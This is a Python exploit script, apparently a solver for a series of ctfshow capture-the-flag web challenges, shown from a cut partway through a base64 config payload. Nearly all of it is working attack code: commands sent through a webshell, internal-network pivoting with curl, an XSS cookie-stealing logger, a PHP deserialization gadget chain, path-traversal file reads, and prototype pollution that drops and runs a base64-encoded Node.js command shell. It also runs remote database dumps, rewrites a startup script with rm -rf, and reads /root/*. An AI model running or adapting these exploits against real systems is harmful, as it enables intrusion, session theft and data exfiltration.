2YWxpZGF0ZSkKO29wY2FjaGUucmV2YWxpZGF0ZV9mcmVxPTIKCjsgRW5hYmxlcyBvciBkaXNhYmxlcyBmaWxlIHNlYXJjaCBpbiBpbmNsdWRlX3BhdGggb3B0aW1pemF0aW9uCjtvcGNhY2hlLnJldmFsaWRhdGVfcGF0aD0wCgo7IElmIGRpc2FibGVkLCBhbGwgUEhQRG9jIGNvbW1lbnRzIGFyZSBkcm9wcGVkIGZyb20gdGhlIGNvZGUgdG8gcmVkdWNlIHRoZQo7IHNpemUgb2YgdGhlIG9wdGltaXplZCBjb2RlLgo7b3BjYWNoZS5zYXZlX2NvbW1lbnRzPTEKCjsgQWxsb3cgZmlsZSBleGlzdGVuY2Ugb3ZlcnJpZGUgKGZpbGVfZXhpc3RzLCBldGMuKSBwZXJmb3JtYW5jZSBmZWF0dXJlLgo7b3BjYWNoZS5lbmFibGVfZmlsZV9vdmVycmlkZT0wCgo7IEEgYml0bWFzaywgd2hlcmUgZWFjaCBiaXQgZW5hYmxlcyBvciBkaXNhYmxlcyB0aGUgYXBwcm9wcmlhdGUgT1BjYWNoZQo7IHBhc3Nlcwo7b3BjYWNoZS5vcHRpbWl6YXRpb25fbGV2ZWw9MHg3RkZGQkZGRgoKO29wY2FjaGUuZHVwc19maXg9MAoKOyBUaGUgbG9jYXRpb24gb2YgdGhlIE9QY2FjaGUgYmxhY2tsaXN0IGZpbGUgKHdpbGRjYXJkcyBhbGxvd2VkKS4KOyBFYWNoIE9QY2FjaGUgYmxhY2tsaXN0IGZpbGUgaXMgYSB0ZXh0IGZpbGUgdGhhdCBob2xkcyB0aGUgbmFtZXMgb2YgZmlsZXMKOyB0aGF0IHNob3VsZCBub3QgYmUgYWNjZWxlcmF0ZWQuIFRoZSBmaWxlIGZvcm1hdCBpcyB0byBhZGQgZWFjaCBmaWxlbmFtZQo7IHRvIGEgbmV3IGxpbmUuIFRoZSBmaWxlbmFtZSBtYXkgYmUgYSBmdWxsIHBhdGggb3IganVzdCBhIGZpbGUgcHJlZml4CjsgKGkuZS4sIC92YXIvd3d3L3ggIGJsYWNrbGlzdHMgYWxsIHRoZSBmaWxlcyBhbmQgZGlyZWN0b3JpZXMgaW4gL3Zhci93d3cKOyB0aGF0IHN0YXJ0IHdpdGggJmFwb3M7eCZhcG9zOykuIExpbmUgc3RhcnRpbmcgd2l0aCBhIDsgYXJlIGlnbm9yZWQgKGNvbW1lbnRzKS4KO29wY2FjaGUuYmxhY2tsaXN0X2ZpbGVuYW1lPQoKOyBBbGxvd3MgZXhjbHVzaW9uIG9mIGxhcmdlIGZpbGVzIGZyb20gYmVpbmcgY2FjaGVkLiBCeSBkZWZhdWx0IGFsbCBmaWxlcwo7IGFyZSBjYWNoZWQuCjtvcGNhY2hlLm1heF9maWxlX3NpemU9MAoKOyBDaGVjayB0aGUgY2FjaGUgY2hlY2tzdW0gZWFjaCBOIHJlcXVlc3RzLgo7IFRoZSBkZWZhdWx0IHZhbHVlIG9mICZxdW90OzAmcXVvdDsgbWVhbnMgdGhhdCB0aGUgY2hlY2tzIGFyZSBkaXNhYmxlZC4KO29wY2FjaGUuY29uc2lzdGVuY3lfY2hlY2tzPTAKCjsgSG93IGxvbmcgdG8gd2FpdCAoaW4gc2Vjb25kcykgZm9yIGEgc2NoZWR1bGVkIHJlc3RhcnQgdG8gYmVnaW4gaWYgdGhlIGNhY2hlCjsgaXMgbm90IGJlaW5nIGFjY2Vzc2VkLgo7b3BjYWNoZS5mb3JjZV9yZXN0YXJ0X3RpbWVvdXQ9MTgwCgo7IE9QY2FjaGUgZXJyb3JfbG9nIGZpbGUgbmFtZS4gRW1wdHkgc3RyaW5nIGFzc3VtZXMgJnF1b3Q7c3RkZXJyJnF1b3Q7Lgo7b3BjYWNoZS5lcnJvcl9sb2c9Cgo7IEFsbCBPUGNhY2hlIGVycm9ycyBnbyB0byB0aGUgV2ViIHNlcnZlciBsb2cuCjsgQnkgZGVmYXVsdCwgb25seSBmYXRhbCBlcnJvcnMgKGxldmVsIDApIG9yIGVycm9ycyAobGV2ZWwgMSkgYXJlIGxvZ2dlZC4KOyBZb3UgY2FuIGFsc28gZW5hYmxlIHdhcm5pbmdzIChsZXZlbCAyKSwgaW5mbyBtZXNzYWdlcyAobGV2ZWwgMykgb3IKOyBkZWJ1ZyBtZXNzYWdlcyAobGV2ZWwgNCkuCjtvcGNhY2hlLmxvZ192ZXJib3NpdHlfbGV2ZWw9MQoKOyBQcmVmZXJyZWQgU2hhcmVkIE1lbW9yeSBiYWNrLWVuZC4gTGVhdmUgZW1wdHkgYW5kIGxldCB0aGUgc3lzdGVtIGRlY2lkZS4KO29wY2FjaGUucHJlZmVycmVkX21lbW9yeV9tb2RlbD0KCjsgUHJvdGVjdCB0aGUgc2hhcmVkIG1lbW9yeSBmcm9tIHVuZXhwZWN0ZWQgd3JpdGluZyBkdXJpbmcgc2NyaXB0IGV4ZWN1dGlvbi4KOyBVc2VmdWwgZm9yIGludGVybmFsIGRlYnVnZ2luZyBvbmx5Lgo7b3BjYWNoZS5wcm90ZWN0X21lbW9yeT0wCgo7IEFsbG93cyBjYWxsaW5nIE9QY2FjaGUgQVBJIGZ1bmN0aW9ucyBvbmx5IGZyb20gUEhQIHNjcmlwdHMgd2hpY2ggcGF0aCBpcwo7IHN0YXJ0ZWQgZnJvbSBzcGVjaWZpZWQgc3RyaW5nLiBUaGUgZGVmYXVsdCAmcXVvdDsmcXVvdDsgbWVhbnMgbm8gcmVzdHJpY3Rpb24KO29wY2FjaGUucmVzdHJpY3RfYXBpPQoKOyBNYXBwaW5nIGJhc2Ugb2Ygc2hhcmVkIG1lbW9yeSBzZWdtZW50cyAoZm9yIFdpbmRvd3Mgb25seSkuIEFsbCB0aGUgUEhQCjsgcHJvY2Vzc2VzIGhhdmUgdG8gbWFwIHNoYXJlZCBtZW1vcnkgaW50byB0aGUgc2FtZSBhZGRyZXNzIHNwYWNlLiBUaGlzCjsgZGlyZWN0aXZlIGFsbG93cyB0byBtYW51YWxseSBmaXggdGhlICZxdW90O1VuYWJsZSB0byByZWF0dGFjaCB0byBiYXNlIGFkZHJlc3MmcXVvdDsKOyBlcnJvcnMuCjtvcGNhY2hlLm1tYXBfYmFzZT0KCjsgRW5hYmxlcyBhbmQgc2V0cyB0aGUgc2Vjb25kIGxldmVsIGNhY2hlIGRpcmVjdG9yeS4KOyBJdCBzaG91bGQgaW1wcm92ZSBwZXJmb3JtYW5jZSB3aGVuIFNITSBtZW1vcnkgaXMgZnVsbCwgYXQgc2VydmVyIHJlc3RhcnQgb3IKOyBTSE0gcmVzZXQuIFRoZSBkZWZhdWx0ICZxdW90OyZxdW90OyBkaXNhYmxlcyBmaWxlIGJhc2VkIGNhY2hpbmcuCjtvcGNhY2hlLmZpbGVfY2FjaGU9Cgo7IEVuYWJsZXMgb3IgZGlzYWJsZXMgb3Bjb2RlIGNhY2hpbmcgaW4gc2hhcmVkIG1lbW9yeS4KO29wY2FjaGUuZmlsZV9jYWNoZV9vbmx5PTAKCjsgRW5hYmxlcyBvciBkaXNhYmxlcyBjaGVja3N1bSB2YWxpZGF0aW9uIHdoZW4gc2NyaXB0IGxvYWRlZCBmcm9tIGZpbGUgY2FjaGUuCjtvcGNhY2hlLmZpbGVfY2FjaGVfY29uc2lzdGVuY3lfY2hlY2tzPTEKCjsgSW1wbGllcyBvcGNhY2hlLmZpbGVfY2FjaGVfb25seT0xIGZvciBhIGNlcnRhaW4gcHJvY2VzcyB0aGF0IGZhaWxlZCB0bwo7IHJlYXR0YWNoIHRvIHRoZSBzaGFyZWQgbWVtb3J5IChmb3IgV2luZG93cyBvbmx5KS4gRXhwbGljaXRseSBlbmFibGVkIGZpbGUKOyBjYWNoZSBpcyByZXF1aXJlZC4KO29wY2FjaGUuZmlsZV9jYWNoZV9mYWxsYmFjaz0xCgo7IEVuYWJsZXMgb3IgZGlzYWJsZXMgY29weWluZyBvZiBQSFAgY29kZSAodGV4dCBzZWdtZW50KSBpbnRvIEhVR0UgUEFHRVMuCjsgVGhpcyBzaG91bGQgaW1wcm92ZSBwZXJmb3JtYW5jZSwgYnV0IHJlcXVpcmVzIGFwcHJvcHJpYXRlIE9TIGNvbmZpZ3VyYXRpb24uCjtvcGNhY2hlLmh1Z2VfY29kZV9wYWdlcz0wCgo7IFZhbGlkYXRlIGNhY2hlZCBmaWxlIHBlcm1pc3Npb25zLgo7b3BjYWNoZS52YWxpZGF0ZV9wZXJtaXNzaW9uPTAKCjsgUHJldmVudCBuYW1lIGNvbGxpc2lvbnMgaW4gY2hyb290JmFwb3M7ZWQgZW52aXJvbm1lbnQuCjtvcGNhY2hlLnZhbGlkYXRlX3Jvb3Q9MAoKOyBJZiBzcGVjaWZpZWQsIGl0IHByb2R1Y2VzIG9wY29kZSBkdW1wcyBmb3IgZGVidWdnaW5nIGRpZmZlcmVudCBzdGFnZXMgb2YKOyBvcHRpbWl6YXRpb25zLgo7b3BjYWNoZS5vcHRfZGVidWdfbGV2ZWw9MAoKW2N1cmxdCjsgQSBkZWZhdWx0IHZhbHVlIGZvciB0aGUgQ1VSTE9QVF9DQUlORk8gb3B0aW9uLiBUaGlzIGlzIHJlcXVpcmVkIHRvIGJlIGFuCjsgYWJzb2x1dGUgcGF0aC4KO2N1cmwuY2FpbmZvID0KCltvcGVuc3NsXQo7IFRoZSBsb2NhdGlvbiBvZiBhIENlcnRpZmljYXRlIEF1dGhvcml0eSAoQ0EpIGZpbGUgb24gdGhlIGxvY2FsIGZpbGVzeXN0ZW0KOyB0byB1c2Ugd2hlbiB2ZXJpZnlpbmcgdGhlIGlkZW50aXR5IG9mIFNTTC9UTFMgcGVlcnMuIE1vc3QgdXNlcnMgc2hvdWxkCjsgbm90IHNwZWNpZnkgYSB2YWx1ZSBmb3IgdGhpcyBkaXJlY3RpdmUgYXMgUEhQIHdpbGwgYXR0ZW1wdCB0byB1c2UgdGhlCjsgT1MtbWFuYWdlZCBjZXJ0IHN0b3JlcyBpbiBpdHMgYWJzZW5jZS4gSWYgc3BlY2lmaWVkLCB0aGlzIHZhbHVlIG1heSBzdGlsbAo7IGJlIG92ZXJyaWRkZW4gb24gYSBwZXItc3RyZWFtIGJhc2lzIHZpYSB0aGUgJnF1b3Q7Y2FmaWxlJnF1b3Q7IFNTTCBzdHJlYW0gY29udGV4dAo7IG9wdGlvbi4KO29wZW5zc2wuY2FmaWxlPQoKOyBJZiBvcGVuc3NsLmNhZmlsZSBpcyBub3Qgc3BlY2lmaWVkIG9yIGlmIHRoZSBDQSBmaWxlIGlzIG5vdCBmb3VuZCwgdGhlCjsgZGlyZWN0b3J5IHBvaW50ZWQgdG8gYnkgb3BlbnNzbC5jYXBhdGggaXMgc2VhcmNoZWQgZm9yIGEgc3VpdGFibGUKOyBjZXJ0aWZpY2F0ZS4gVGhpcyB2YWx1ZSBtdXN0IGJlIGEgY29ycmVjdGx5IGhhc2hlZCBjZXJ0aWZpY2F0ZSBkaXJlY3RvcnkuCjsgTW9zdCB1c2VycyBzaG91bGQgbm90IHNwZWNpZnkgYSB2YWx1ZSBmb3IgdGhpcyBkaXJlY3RpdmUgYXMgUEhQIHdpbGwKOyBhdHRlbXB0IHRvIHVzZSB0aGUgT1MtbWFuYWdlZCBjZXJ0IHN0b3JlcyBpbiBpdHMgYWJzZW5jZS4gSWYgc3BlY2lmaWVkLAo7IHRoaXMgdmFsdWUgbWF5IHN0aWxsIGJlIG92ZXJyaWRkZW4gb24gYSBwZXItc3RyZWFtIGJhc2lzIHZpYSB0aGUgJnF1b3Q7Y2FwYXRoJnF1b3Q7CjsgU1NMIHN0cmVhbSBjb250ZXh0IG9wdGlvbi4KO29wZW5zc2wuY2FwYXRoPQoKOyBMb2NhbCBWYXJpYWJsZXM6CjsgdGFiLXdpZHRoOiA0CjsgRW5kOg==|base64 -d > a.txt`;'})
#获取内网ip
r1=sess.post(url+"1.php",data={'1':'echo `cat /etc/hosts`;'})
#print(r1.text)
ip1=re.findall('(172.*?)web',r1.text,re.S)[0].strip()
#print(ip1)
ip2=re.sub("\.4$",'.5',ip1)  #另外一台服务器地址
print(ip2)
print(re.findall('flag_.*?=ctfshow{.*?}',sess.post(url+'1.php',data={'1':"echo `curl http://{0}/phpinfo.php`;".format(ip2)}).text)[0])

#ssss='bash -c "echo dmFyIGh0dHAgPSByZXF1aXJlKCdodHRwJyk7CnZhciBxdWVyeXN0cmluZyA9IHJlcXVpcmUoJ3F1ZXJ5c3RyaW5nJyk7Cgp2YXIgcG9zdEhUTUwgPSAnMTIzJzsKIApodHRwLmNyZWF0ZVNlcnZlcihmdW5jdGlvbiAocmVxLCByZXMpIHsKICB2YXIgYm9keSA9ICIiOwogIHJlcS5vbignZGF0YScsIGZ1bmN0aW9uIChjaHVuaykgewogICAgYm9keSArPSBjaHVuazsKICB9KTsKICByZXEub24oJ2VuZCcsIGZ1bmN0aW9uICgpIHsKICAgIGJvZHkgPSBxdWVyeXN0cmluZy5wYXJzZShib2R5KTsKICAgIHJlcy53cml0ZUhlYWQoMjAwLCB7J0NvbnRlbnQtVHlwZSc6ICd0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmOCd9KTsKIHRyeXsKICAgIGlmKGJvZHkuY21kKSB7CiAgICAgICAgcmVzLndyaXRlKCJ1c2VybmFtZe+8miIgKyBib2R5LmNtZCk7CiAgICAgICAgdmFyIHJlc3VsdD0gZ2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdiYXNoIC1jICInK2JvZHkuY21kKyciJykudG9TdHJpbmcoKTsKICAgICAgICByZXMud3JpdGUocmVzdWx0KTsKICAgIH0gZWxzZSB7CiAgICAgICAgcmVzLndyaXRlKHBvc3RIVE1MKTsKICAgIH19CiAgICBjYXRjaHsKICAgICAgIHJlcy53cml0ZShwb3N0SFRNTCk7IAogICAgfQogICAgcmVzLmVuZCgpOwogIH0pOwp9KS5saXN0ZW4oODAzMyk7Cg==|base64 -d > /home/node/aa.js;node /home/node/aa.js"'
#print(base64.b64encode(ssss.encode()))
#xss获取cookie
sess.post(url+'1.php',data={'1':"file_put_contents('log.php','<?php highlight_file(__FILE__);$parameter = $_SERVER[\"QUERY_STRING\"].$_SERVER[\"HTTP_COOKIE\"];file_put_contents(\"log.txt\",$parameter);');?>"})
u="http://{0}/log.php?s=".format(ip1) #当然每个人的内网地址可能不一样
#u="http://{0}/?action=main&".format(ip2)
#a='''echo `curl -i -X POST -H 'Content-type':'application/json' -d "{\\"__proto__\\":{\\"__proto__\\": {\\"type\\":\\"Block\\",\\"nodes\\":\\"\\",\\"compileDebug\\":1,\\"self\\":1,\\"line\\":\\"global.process.mainModule.require('child_process').exec('echo YmFzaCAtYyAiZWNobyBkbUZ5SUdoMGRIQWdQU0J5WlhGMWFYSmxLQ2RvZEhSd0p5azdDblpoY2lCeGRXVnllWE4wY21sdVp5QTlJSEpsY1hWcGNtVW9KM0YxWlhKNWMzUnlhVzVuSnlrN0NncDJZWElnY0c5emRFaFVUVXdnUFNBbk1USXpKenNLSUFwb2RIUndMbU55WldGMFpWTmxjblpsY2lobWRXNWpkR2x2YmlBb2NtVnhMQ0J5WlhNcElIc0tJQ0IyWVhJZ1ltOWtlU0E5SUNJaU93b2dJSEpsY1M1dmJpZ25aR0YwWVNjc0lHWjFibU4wYVc5dUlDaGphSFZ1YXlrZ2V3b2dJQ0FnWW05a2VTQXJQU0JqYUhWdWF6c0tJQ0I5S1RzS0lDQnlaWEV1YjI0b0oyVnVaQ2NzSUdaMWJtTjBhVzl1SUNncElIc0tJQ0FnSUdKdlpIa2dQU0J4ZFdWeWVYTjBjbWx1Wnk1d1lYSnpaU2hpYjJSNUtUc0tJQ0FnSUhKbGN5NTNjbWwwWlVobFlXUW9NakF3TENCN0owTnZiblJsYm5RdFZIbHdaU2M2SUNkMFpYaDBMMmgwYld3N0lHTm9ZWEp6WlhROWRYUm1PQ2Q5S1RzS0lIUnllWHNLSUNBZ0lHbG1LR0p2WkhrdVkyMWtLU0I3Q2lBZ0lDQWdJQ0FnY21WekxuZHlhWFJsS0NKMWMyVnlibUZ0WmUrOG1pSWdLeUJpYjJSNUxtTnRaQ2s3Q2lBZ0lDQWdJQ0FnZG1GeUlISmxjM1ZzZEQwZ1oyeHZZbUZzTG5CeWIyTmxjM011YldGcGJrMXZaSFZzWlM1amIyNXpkSEoxWTNSdmNpNWZiRzloWkNnblkyaHBiR1JmY0hKdlkyVnpjeWNwTG1WNFpXTlRlVzVqS0NkaVlYTm9JQzFqSUNJbksySnZaSGt1WTIxa0t5Y2lKeWt1ZEc5VGRISnBibWNvS1RzS0lDQWdJQ0FnSUNCeVpYTXVkM0pwZEdVb2NtVnpkV3gwS1RzS0lDQWdJSDBnWld4elpTQjdDaUFnSUNBZ0lDQWdjbVZ6TG5keWFYUmxLSEJ2YzNSSVZFMU1LVHNLSUNBZ0lIMTlDaUFnSUNCallYUmphSHNLSUNBZ0lDQWdJSEpsY3k1M2NtbDBaU2h3YjNOMFNGUk5UQ2s3SUFvZ0lDQWdmUW9nSUNBZ2NtVnpMbVZ1WkNncE93b2dJSDBwT3dwOUtTNXNhWE4wWlc0b09EQXpNeWs3Q2c9PXxiYXNlNjQgLWQgPiAvaG9tZS9ub2RlL2FhLmpzO25vZGUgL2hvbWUvbm9kZS9hYS5qcyI=|base64 -d|bash')\\"}}}" http://'''+ip2+''':3000/login`;'''
a=''
#print(a)
sess.post(url+'1.php',data={'1':a})
for i in u:
    a=a+str(ord(i))+','
a=re.sub(",$",'',a)
#sess.post(url+"1.php",data={'1':'`curl --header "X-Forwarded-For:<script>window.location.href=String.fromCharCode({0})+document.cookie;</script>" http://{1}/index.php?action=login\&u=1aaaxp12\&p=345`;'.format(a,ip2)})

sess.post(url+"1.php",data={'1':'`curl --header "X-Forwarded-For:<script>window.location.href=String.fromCharCode({0})+document.cookie;</script>" http://{1}/index.php?action=login\&u=0002\&p=345`;'.format(a,ip2)})
## 隔上一两分钟访问log.txt就能拿到cookie和auth
while True:
    try:
        log=sess.get(url+'log.txt').text
        phpsessid=re.findall("(PHPSESSID=.*?);%20",log)[0]
        auth=re.findall("(auth=.*)",log)[0]
        #print(phpsessid)
        flag656=str(base64.b64decode(auth))
        #web656
        print(re.findall('flag.*?=ctfshow{.*?}',flag656)[0])
        break
    except:
        print('error')
        time.sleep(60)# 应该是一分钟一次
## 拿着cookie去登录

#web657
r2=sess.post(url+"1.php",data={'1':'echo ` curl --header "Cookie:{0};{1}" -i http://{2}/index.php?action=main\\&m=getFlag`;'.format(phpsessid,auth,ip2)})
print(re.findall('flag.*?=ctfshow{.*?}',r2.text)[0])

#web658
ser="O%3A32%3A%22Codeception%5CExtension%5CRunProcess%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00output%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Bs%3A5%3A%22jiang%22%3B%7Ds%3A43%3A%22%00Codeception%5CExtension%5CRunProcess%00processes%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3BO%3A28%3A%22GuzzleHttp%5CPsr7%5CAppendStream%22%3A2%3A%7Bs%3A37%3A%22%00GuzzleHttp%5CPsr7%5CAppendStream%00streams%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A29%3A%22GuzzleHttp%5CPsr7%5CCachingStream%22%3A2%3A%7Bs%3A43%3A%22%00GuzzleHttp%5CPsr7%5CCachingStream%00remoteStream%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Bb%3A0%3B%7Ds%3A6%3A%22stream%22%3BO%3A26%3A%22GuzzleHttp%5CPsr7%5CPumpStream%22%3A3%3A%7Bs%3A34%3A%22%00GuzzleHttp%5CPsr7%5CPumpStream%00source%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A231%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22function%22%3Bs%3A76%3A%22function%28%29%7B%5Cphpinfo%28%29%3B%5Chighlight_file%28%27%2Fvar%2Fwww%2Fhtml%2Fflag.php%27%29%3B%5Cphpinfo%28%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3Bs%3A26%3A%22GuzzleHttp%5CPsr7%5CPumpStream%22%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%22000000004e63ed86000000002cc68e15%22%3B%7D%7Ds%3A32%3A%22%00GuzzleHttp%5CPsr7%5CPumpStream%00size%22%3Bi%3A-10%3Bs%3A34%3A%22%00GuzzleHttp%5CPsr7%5CPumpStream%00buffer%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Bs%3A1%3A%22j%22%3B%7D%7D%7D%7Ds%3A38%3A%22%00GuzzleHttp%5CPsr7%5CAppendStream%00seekable%22%3Bb%3A1%3B%7D%7D%7D%7D"
data={'1':'echo ` curl  -H "Content-Type: application/x-www-form-urlencoded"   -X POST  -d "UnserializeForm[ctfshowUnserializeData]={0}" http://{1}:8888?r=site/unserialize\\&key=flag_663%3Dctfshow%7Bfa5cc1fb0bfc986d1ef150269c0de197%7D`;'.format(ser,ip2)}
flags=re.findall('flag.*?=ctfshow{.*?}',sess.post(url+"1.php",data=data).text)
print(flags[4])
#web659
print(flags[5])

#web660
sess.post(url+"1.php",data={'1':'`curl --header "X-Forwarded-For:<script>window.location.href=String.fromCharCode({0})+document.cookie;</script>" http://{1}/index.php?action=login\&u=1aaaxp12\&p=345`;'.format(a,ip2)})
print(re.findall('flag.*?ctfshow{.*?}',sess.post(url+'1.php',data={'1':"echo file_get_contents('http://{0}/public../var/log/nginx/ctfshow_web_access_log_file_you_never_know.log ');".format(ip2)}).text)[0])

#web661
print(re.findall('flag.*?=ctfshow{.*?}',sess.post(url+'1.php',data={'1':"echo file_get_contents('http://{0}/public../home/flag/secret.txt');".format(ip2)}).text)[0])

#web662 web663
'''
for i in range(0,4096):
    r=sess.post(url+'1.php',data={'1':'echo file_get_contents("http://{0}/{1}.html");'.format(ip2,hex(i).replace('0x','').zfill(3))})
    if "404"  not in r.text:
        print(i)
        print(r.text)
        break
'''
#web664
ser="O%3A32%3A%22Codeception%5CExtension%5CRunProcess%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00output%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Bs%3A5%3A%22jiang%22%3B%7Ds%3A43%3A%22%00Codeception%5CExtension%5CRunProcess%00processes%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3BO%3A28%3A%22GuzzleHttp%5CPsr7%5CAppendStream%22%3A2%3A%7Bs%3A37%3A%22%00GuzzleHttp%5CPsr7%5CAppendStream%00streams%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A29%3A%22GuzzleHttp%5CPsr7%5CCachingStream%22%3A2%3A%7Bs%3A43%3A%22%00GuzzleHttp%5CPsr7%5CCachingStream%00remoteStream%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Bb%3A0%3B%7Ds%3A6%3A%22stream%22%3BO%3A26%3A%22GuzzleHttp%5CPsr7%5CPumpStream%22%3A3%3A%7Bs%3A34%3A%22%00GuzzleHttp%5CPsr7%5CPumpStream%00source%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A228%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22function%22%3Bs%3A73%3A%22function%28%29%7B%5Cphpinfo%28%29%3B%5Chighlight_file%28%27%2Fvar%2Foa%2Fflag664.php%27%29%3B%5Cphpinfo%28%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3Bs%3A26%3A%22GuzzleHttp%5CPsr7%5CPumpStream%22%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%22000000000b45001f0000000040612da3%22%3B%7D%7Ds%3A32%3A%22%00GuzzleHttp%5CPsr7%5CPumpStream%00size%22%3Bi%3A-10%3Bs%3A34%3A%22%00GuzzleHttp%5CPsr7%5CPumpStream%00buffer%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Bs%3A1%3A%22j%22%3B%7D%7D%7D%7Ds%3A38%3A%22%00GuzzleHttp%5CPsr7%5CAppendStream%00seekable%22%3Bb%3A1%3B%7D%7D%7D%7D"
data={'1':'echo ` curl  -H "Content-Type: application/x-www-form-urlencoded"   -X POST  -d "UnserializeForm[ctfshowUnserializeData]={0}" http://{1}:8888?r=site/unserialize\\&key=flag_663%3Dctfshow%7Bfa5cc1fb0bfc986d1ef150269c0de197%7D`;'.format(ser,ip2)}
flags=re.findall('flag_.*?=ctfshow{.*?}',sess.post(url+"1.php",data=data).text)
print(flags[2])

#web665
print(re.findall('flag.*?=ctfshow{.*?}',sess.post(url+'1.php',data={'1':"echo file_get_contents('http://{0}/public../FLAG665');".format(ip2)}).text)[0])

#web667
print(re.findall('flag_.*?=ctfshow{.*?}',sess.post(url+'1.php',data={'1':"echo file_get_contents('http://{0}:3000');".format(ip2)}).text)[0])

a='''echo `curl -i -X POST -H 'Content-type':'application/json' -d "{\\"__proto__\\":{\\"__proto__\\": {\\"type\\":\\"Block\\",\\"nodes\\":\\"\\",\\"compileDebug\\":1,\\"self\\":1,\\"line\\":\\"global.process.mainModule.require('child_process').exec('echo YmFzaCAtYyAiZWNobyBkbUZ5SUdoMGRIQWdQU0J5WlhGMWFYSmxLQ2RvZEhSd0p5azdDblpoY2lCeGRXVnllWE4wY21sdVp5QTlJSEpsY1hWcGNtVW9KM0YxWlhKNWMzUnlhVzVuSnlrN0NncDJZWElnY0c5emRFaFVUVXdnUFNBbk1USXpKenNLSUFwb2RIUndMbU55WldGMFpWTmxjblpsY2lobWRXNWpkR2x2YmlBb2NtVnhMQ0J5WlhNcElIc0tJQ0IyWVhJZ1ltOWtlU0E5SUNJaU93b2dJSEpsY1M1dmJpZ25aR0YwWVNjc0lHWjFibU4wYVc5dUlDaGphSFZ1YXlrZ2V3b2dJQ0FnWW05a2VTQXJQU0JqYUhWdWF6c0tJQ0I5S1RzS0lDQnlaWEV1YjI0b0oyVnVaQ2NzSUdaMWJtTjBhVzl1SUNncElIc0tJQ0FnSUdKdlpIa2dQU0J4ZFdWeWVYTjBjbWx1Wnk1d1lYSnpaU2hpYjJSNUtUc0tJQ0FnSUhKbGN5NTNjbWwwWlVobFlXUW9NakF3TENCN0owTnZiblJsYm5RdFZIbHdaU2M2SUNkMFpYaDBMMmgwYld3N0lHTm9ZWEp6WlhROWRYUm1PQ2Q5S1RzS0lIUnllWHNLSUNBZ0lHbG1LR0p2WkhrdVkyMWtLU0I3Q2lBZ0lDQWdJQ0FnY21WekxuZHlhWFJsS0NKMWMyVnlibUZ0WmUrOG1pSWdLeUJpYjJSNUxtTnRaQ2s3Q2lBZ0lDQWdJQ0FnZG1GeUlISmxjM1ZzZEQwZ1oyeHZZbUZzTG5CeWIyTmxjM011YldGcGJrMXZaSFZzWlM1amIyNXpkSEoxWTNSdmNpNWZiRzloWkNnblkyaHBiR1JmY0hKdlkyVnpjeWNwTG1WNFpXTlRlVzVqS0NkaVlYTm9JQzFqSUNJbksySnZaSGt1WTIxa0t5Y2lKeWt1ZEc5VGRISnBibWNvS1RzS0lDQWdJQ0FnSUNCeVpYTXVkM0pwZEdVb2NtVnpkV3gwS1RzS0lDQWdJSDBnWld4elpTQjdDaUFnSUNBZ0lDQWdjbVZ6TG5keWFYUmxLSEJ2YzNSSVZFMU1LVHNLSUNBZ0lIMTlDaUFnSUNCallYUmphSHNLSUNBZ0lDQWdJSEpsY3k1M2NtbDBaU2h3YjNOMFNGUk5UQ2s3SUFvZ0lDQWdmUW9nSUNBZ2NtVnpMbVZ1WkNncE93b2dJSDBwT3dwOUtTNXNhWE4wWlc0b09EQXpNeWs3Q2c9PXxiYXNlNjQgLWQgPiAvaG9tZS9ub2RlL2FhLmpzO25vZGUgL2hvbWUvbm9kZS9hYS5qcyI=|base64 -d|bash')\\"}}}" http://'''+ip2+''':3000/login`;'''
sess.post(url+"1.php",data={'1':a})
sess.post(url+"1.php",data={'1':'echo `curl -X POST -d "1=123" http://{0}:3000`;'.format(ip2)})


#web666
while True:
    try:
        print(re.findall('flag_.*?=ctfshow{.*?}',sess.post(url+'1.php',data={'1':"echo `curl -X POST -d \"cmd=mysql -uroot -proot -e 'use ctfshow;select * from ctfshow_secret'\" http://{0}:8033`;".format(ip2)}).text)[0])

        #web668
        print(re.findall('flag_.*?=ctfshow{.*?}',sess.post(url+'1.php',data={'1':"echo `curl -X POST -d \"cmd=tac secret.txt\" http://{0}:8033`;".format(ip2)}).text)[0])
        sess.post(url+'1.php',data={'1':"echo `curl -X POST -d \"cmd=rm -rf  nodestartup.sh;echo 'cat /root/* > /home/node/a.txt ' > nodestartup.sh\" http://{0}:8033`;".format(ip2)})
        #web669
        while True:
            r=sess.post(url+'1.php',data={'1':"echo `curl -X POST -d \"cmd=cat a.txt\" http://{0}:8033`;".format(ip2)})
            if "flag" in r.text:
                print(r.text)
